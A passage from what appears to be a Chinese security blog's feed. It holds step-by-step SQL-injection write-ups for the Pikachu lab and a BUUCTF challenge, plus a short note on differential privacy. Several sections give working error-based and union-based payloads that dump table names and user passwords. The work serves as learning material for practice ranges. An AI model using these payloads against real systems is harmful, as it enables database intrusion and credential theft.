class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(username))<span class="hljs-keyword">from</span>(users)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/10.jpg" style="zoom:60%;" /></center><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(password))<span class="hljs-keyword">from</span>(users)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94delete%E5%9E%8B/11.jpg" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="8-解码"><a href="#8-解码" class="headerlink" title="8.解码"></a>8.解码</h4><p>&emsp;&emsp;“MD5的码，请阅读SQL——数字型”</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/1.png" style="zoom:150%;" /></center>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>报错注入——update型</title>
    <link href="/2022/08/13/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/"/>
    <url>/2022/08/13/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="报错注入——update型"><a href="#报错注入——update型" class="headerlink" title="报错注入——update型"></a>报错注入——update型</h1><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><p>&emsp;&emsp;登录界面:</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/1.jpg" style="zoom:67%;" /></center><p>&emsp;&emsp;尝试输入内容查看是否有有用的反馈：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/2.jpg" style="zoom:67%;" /></center><p>&emsp;&emsp;很明显，并没有反馈的东西，我们尝试点击注册内容</p><p>&emsp;</p><h4 id="2-点击注册"><a href="#2-点击注册" class="headerlink" title="2.点击注册"></a>2.点击注册</h4><p>&emsp;&emsp;注册界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/3.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;明显这就是update更改数据库内容的注册语句，Mysql的update的语句形式如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;liaoyue&#x27;</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>$id;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;对于update函数而言，注入的方式是盲注的形式，可以是布尔、时间或者报错注入，下面采用的是报错注入的方式，前两种注入方式后面会讲到。</p><p>&emsp;</p><h4 id="3-分析报文"><a href="#3-分析报文" class="headerlink" title="3.分析报文"></a>3.分析报文</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/4.jpg" style="zoom:67%;" /></center>&emsp;&emsp;在username的值处添加单引号，查看情况:<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/5.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;可以看见在最后是以POST的形式传输注册的内容进行数据库的修改，并且存在mysql报错的反馈，这里是个注入点，开始尝试注入。</p><p>&emsp;</p><h4 id="4-使用updatexml函数获取数据库名"><a href="#4-使用updatexml函数获取数据库名" class="headerlink" title="4.使用updatexml函数获取数据库名"></a>4.使用updatexml函数获取数据库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; or (updatexml(1,concat(0x7e,database(),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/6.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;这里为什么结尾不是#了呢，这是因为这个上传后续还有其他的东西，如果直接用#注释掉就无法完成闭合（个人理解），所以要用or’进行闭合，注入完一看，是error的内容中出现了pikaqiu，成功的将数据库名输出了</p><p>&emsp;</p><h4 id="5-获取数据库表名"><a href="#5-获取数据库表名" class="headerlink" title="5.获取数据库表名"></a>5.获取数据库表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/7.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;有缺失，说明长度不够长，使用substr函数，其中：</p><ul><li>substr(string ,1,3) ：取string左边第1位置起，3字长的字符串</li><li>substr(string, -1,3)：取string右边第1位置起，3字长的字符串</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (updatexml(1,concat(0x7e,substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),32,31),0x7e),1)) or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/9.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;将两次反馈拼接起来就是所有的数据库表名了</p><p>&emsp;</p><h4 id="6-获取表"><a href="#6-获取表" class="headerlink" title="6.获取表"></a>6.获取表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and (updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>users<span class="hljs-string">&#x27;)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/8.jpg" style="zoom:60%;" /></center><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and (updatexml(1,concat(0x7e,substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>users<span class="hljs-string">&#x27;)),32,32),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/10.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;通过注入，我们获取到了用户名和密码的列表，接下来就是获取其中的信息了。</p><p>&emsp;</p><h4 id="7-获取表中的内容"><a href="#7-获取表中的内容" class="headerlink" title="7.获取表中的内容"></a>7.获取表中的内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and (updatexml(1,concat(0x7e,(select(group_concat(username))from(users)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/11.jpg" style="zoom:60%;" /></center><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and (updatexml(1,concat(0x7e,(select(group_concat(password))from(users)),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/12.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;内容显示不全就继续使用substr函数进行补全</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;  and (updatexml(1,concat(0x7e,substr((select(group_concat(password))from(users)),32,32),0x7e),1))or&#x27;</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/13.jpg" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="8-解码"><a href="#8-解码" class="headerlink" title="8.解码"></a>8.解码</h4><p>&emsp;&emsp;“MD5的码，请阅读SQL——数字型”</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94update%E5%9E%8B/1.png" style="zoom:150%;" /></center>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——报错注入</title>
    <link href="/2022/08/12/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/08/12/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——报错注入"><a href="#SQL注入——报错注入" class="headerlink" title="SQL注入——报错注入"></a>SQL注入——报错注入</h1><p>0.前言</p><p>&emsp;&emsp;报错注入作为可回显注入的另外一种，当联合注入无法使用时，我们可以考虑使用报错注入。它是通过特殊函数错误使用并使其输出错误结果来获取信息的。通俗地讲，是利用了相关函数改变输出错误结果的情况下输出数据库的相关信息。</p><p>&emsp;&emsp;通过上述的话，也就能够知道，报错注入的前提是页面需要出现登录错误的信息。二针对报错函数的不同，也就有这多种多样的注入方式，所以当我们使用某种函数进行报错注入的时候，我们就需要去了解这个函数的构造。话不多说，直接举个”栗子“</p><p>&emsp;&emsp;对于UpdateXML()、ExtractValue()函数而言，参数xpath_expr路径语法错误时，就会反馈错误，将xpath_expr中内容当作sql语句执行后结果和报错结果一同返回。<br>&emsp;&emsp;对于floor()函数而言，则需要count()、rand()、group by，三者缺一不可。floor(rand(0)2)每次执行结果是基本固定的011011…形式。所以在使用group by floor(rand(0)2)创建虚拟表的过程中，会向虚拟表中插入数据的同时，主键的计算产生相同的结果，插入报错。</p><p>&emsp;（下面将以BUUCTF中的HardSQL1为例）</p><p>&emsp;</p><h4 id="1-初始界面"><a href="#1-初始界面" class="headerlink" title="1.初始界面"></a>1.初始界面</h4><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/1.png" style="zoom: 50%;" /></center><p>&emsp;&emsp;可以看见，拥有用户名和密码两个输入口，我们可以在这两个注入点做文章。</p><p>&emsp;</p><h4 id="2-尝试or的注入"><a href="#2-尝试or的注入" class="headerlink" title="2.尝试or的注入"></a>2.尝试or的注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or 1=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/2.png" style="zoom: 50%;" /></center><p>&emsp;&emsp;看到反馈了，说明注入是失败了，这说明我们是没办法使用联合注入了。但是有回显，我们此时想到了报错注入</p><p>&emsp;</p><h4 id="3-使用updatexml函数获取数据库名"><a href="#3-使用updatexml函数获取数据库名" class="headerlink" title="3.使用updatexml函数获取数据库名"></a>3.使用updatexml函数获取数据库名</h4><p>&emsp;&emsp;首先了解updatexml函数的构造</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">UPDATEXML (XML_document, XPath_string, new_value); <br></code></pre></td></tr></table></figure><p>&emsp;&emsp;第一个参数xml_document是xml文档对象的名称，第二个参数xpath_string是xpath格式的字符串，第三个参数new_value,是替换查找到符合条件的数据。这个函数的作用是改变文档中符合条件的结点的值。</p><p>&emsp;&emsp;在注入语句时，可以搭配concat()函数使用，由于concat函数是将结果连成一个字符串的形式，因此不会符合xpath_string的格式，从而出现格式错误，导致相关的数据被爆出。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/3.png" style="zoom: 67%;" /></center><p>&emsp;&emsp;注入完一看，是error的内容中出现了geek，有戏，成功的将数据库名输出了</p><p>&emsp;</p><h4 id="4-获取数据库表名"><a href="#4-获取数据库表名" class="headerlink" title="4.获取数据库表名"></a>4.获取数据库表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/4.png" style="zoom: 67%;" /></center><p>&emsp;&emsp;成功将表名输出,可以看到表名卫H4rDsq1。</p><p>&emsp;</p><h4 id="5-获取表中的列名"><a href="#5-获取表中的列名" class="headerlink" title="5.获取表中的列名"></a>5.获取表中的列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="hljs-string">&#x27;)),0x7e),1))#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/5.png" style="zoom: 67%;" /></center><p>&emsp;&emsp;成功获取列名，接下来根据列名查找内容</p><p>&emsp;</p><h4 id="6-获取列中的信息"><a href="#6-获取列中的信息" class="headerlink" title="6.获取列中的信息"></a>6.获取列中的信息</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/8.png" style="zoom: 67%;" /></center><p>&emsp;&emsp; 查询列的内容，找到了flag，但显然，是不完全的，所以需要拼接操作。</p><p>&emsp;</p><h4 id="7-显示信息拼接"><a href="#7-显示信息拼接" class="headerlink" title="7.显示信息拼接"></a>7.显示信息拼接</h4><p>&emsp;&emsp;这里使用left()函数和right()函数进行拼接操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e),1))#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/6.png" style="zoom: 67%;" /></center><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(left(password,30)))from(H4rDsq1)),0x7e),1))#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/7.png" style="zoom: 67%;" /></center><h4 id="8-其他-mysql报错注入类型参考网站"><a href="#8-其他-mysql报错注入类型参考网站" class="headerlink" title="8.其他(mysql报错注入类型参考网站)"></a>8.其他(mysql报错注入类型参考网站)</h4><p>&emsp;&emsp; <a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p><p>&emsp;&emsp;<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a></p><p>&emsp; &emsp;  ——通过注入进行DNS请求，从而达到可以回显的目的</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据安全技术前沿研究笔记（三）</title>
    <link href="/2022/08/12/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%B9%8B%E5%B7%AE%E5%88%86%E9%9A%90%E7%A7%81/"/>
    <url>/2022/08/12/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%B9%8B%E5%B7%AE%E5%88%86%E9%9A%90%E7%A7%81/</url>
    
    <content type="html"><![CDATA[<h1 id="数据安全技术之差分隐私"><a href="#数据安全技术之差分隐私" class="headerlink" title="数据安全技术之差分隐私"></a>数据安全技术之差分隐私</h1><h4 id="1-差分隐私的定义"><a href="#1-差分隐私的定义" class="headerlink" title="1.差分隐私的定义"></a>1.差分隐私的定义</h4><p>&emsp;&emsp;差分隐私技术由于无需假设攻击者能力或知识背景，安全性可通过数学模型证明，作为一种前沿的隐私保护技术受到广泛的关注。它可以确保数据库插入或删除一条记录不会对查询或统计的结果造成显著性的影响</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%B9%8B%E5%B7%AE%E5%88%86%E9%9A%90%E7%A7%81/2.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;其中D 和 D′分别指相邻的数据集（差别只有一条建立），函数f是某种操作或算法（比如查询、求平均、总和等），对于输出C，两个数据集输出这样结果的概率几乎是接近的，即两者概率比值小于 e^ε ，那么称为满足 ε −ε隐私。一般来说，通过在查询结果中加入噪声，比如Laplace 类型的噪声，使得查询结果在一定范围内失真，并且保持两个相邻数据库概率分布几乎相同。ε 参数通常被称为隐私预算，ε 越小，两次查询的结果越接近，即隐私保护程度越高。</p><p>&emsp;</p><h4 id="2-通俗解释"><a href="#2-通俗解释" class="headerlink" title="2.通俗解释"></a>2.通俗解释</h4><p>&emsp;&emsp;用通俗的例子来描述，可能会更好了解一些。假设存在一个数据库，这个数据库可以查询到人员的婚恋情况，如果一开始查询到有4个废物单身，只有2个有对象；这时跑来了个“诺”登记自己的婚姻状况，再查数据库发现5个人是单身，所以能够得出结论——“诺”也是废物。（这也就是差分的由来）</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%B9%8B%E5%B7%AE%E5%88%86%E9%9A%90%E7%A7%81/1.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;（图片来源与网络哦，不是俺弄的）</p><p>&emsp;&emsp;这里的”诺“作为样本的出现，使得攻击者猜出了他的局部信息，而差分隐私需要做到的就算使得攻击者不会因为新样本的出现而获取到新的信息和内容。它引入了随机噪声，原本的对应属性的数量耶呈现了概率分布的情况，简单而言就算，当你询问“诺”是否单身的时候，他有一定概率讲假话，这样子最大化数据查询的准确性，同时最大限度减少识别其记录的机会。</p><p>注：还没更完，周末咯！！！下班！</p>]]></content>
    
    
    <categories>
      
      <category>实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>联合查询注入——括号型</title>
    <link href="/2022/08/11/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/"/>
    <url>/2022/08/11/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="联合查询注入——括号型"><a href="#联合查询注入——括号型" class="headerlink" title="联合查询注入——括号型"></a>联合查询注入——括号型</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;在前面的讲述中，我们一直围绕的是SQL注入的联合查询问题作为注入的切入点，这将是最后一个联合查询的例子演示，比赛和其他平台的相关SQL内容会重新开一个类进行讲述，在最后也会来个总结，接下来是报错注入的相关内容了。</p><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><p>&emsp;&emsp;初始界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/1.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;我们在注入前，需要猜测闭合问题，所以我们可以用最原始的注入去猜测闭合（之前一直忘记提到的），通过闭合的报错得出注入的方式。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;order by 1#</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;报错界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/2.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见，SQL的报错含义是指存在）没有闭合，这说明查询的方式是以</p><p><code>变量 = （&#39;xx&#39;）</code>的形式进行传输。</p><p>&emsp;</p><h4 id="2-分析回显行数"><a href="#2-分析回显行数" class="headerlink" title="2.分析回显行数"></a>2.分析回显行数</h4><p>&emsp;&emsp;（由于这次是括号类型的注入，语句会在原有的基础上加入）进行闭合尝试）</p><p>&emsp;&emsp;判断是否有2行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; ) order by 2 #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/3.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;判断是否有3行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; ) order by 3 #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;从反馈中可以看见，回显行数是2行</p><p>&emsp;</p><h4 id="3-尝试or的注入"><a href="#3-尝试or的注入" class="headerlink" title="3.尝试or的注入"></a>3.尝试or的注入</h4><p>&emsp;&emsp;继续用or的语句注入看看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;)  or 1=1 #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/5.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4.获取数据库名"></a>4.获取数据库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;) union select database(),user()#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/6.jpg" style="zoom:80%;" /></center><h4 id="5-获取表名"><a href="#5-获取表名" class="headerlink" title="5.获取表名"></a>5.获取表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;) union select table_name,table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/7.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-获取表"><a href="#6-获取表" class="headerlink" title="6.获取表"></a>6.获取表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;) union select 1,column_name from information_schema.columns where table_schema = &#x27;</span>pikachu<span class="hljs-string">&#x27; and TABLE_NAME = &#x27;</span>users<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/8.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-获取表的内容"><a href="#7-获取表的内容" class="headerlink" title="7.获取表的内容"></a>7.获取表的内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;) union select username,password from users#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%8B%AC%E5%8F%B7%E5%9E%8B/9.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="8-解码"><a href="#8-解码" class="headerlink" title="8.解码"></a>8.解码</h4><p>&emsp;&emsp;我是懒鬼，不解释了</p><h4 id="9-小总结"><a href="#9-小总结" class="headerlink" title="9.小总结"></a>9.小总结</h4><p>&emsp;&emsp;通过数字类型、字符类型、搜索类型以及括号类型的操作规程，能了解到在联合查询中，我们实现要判断的是有没有注入点，作为可回显的SQL注入类型之一，我们需要找到回显内容的位置，通过预测闭合情况进行注入。</p><p>&emsp;&emsp;在后续的一些SQL题目中，对于联合注入的困难度不仅仅是在闭合当中，对于字符串的过滤等问题也是需要注意的情况。淦就完了！</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>联合查询注入——搜索型</title>
    <link href="/2022/08/10/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/"/>
    <url>/2022/08/10/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="联合查询注入——搜索型"><a href="#联合查询注入——搜索型" class="headerlink" title="联合查询注入——搜索型"></a>联合查询注入——搜索型</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;like语法：”%”匹配任何字符, “like”的意思就是像, “$” 变量。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username,id <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%$name%&#x27;</span><br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="1-查看界面"><a href="#1-查看界面" class="headerlink" title="1.查看界面"></a>1.查看界面</h4><p>&emsp;&emsp;初始界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/1.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;搜索失败界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/2.jpg" style="zoom: 80%;" /></center><p>&emsp;&emsp;搜索成功的界面：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%90%9C%E7%B4%A2%E5%9E%8B/3.jpg" style="zoom: 80%;" 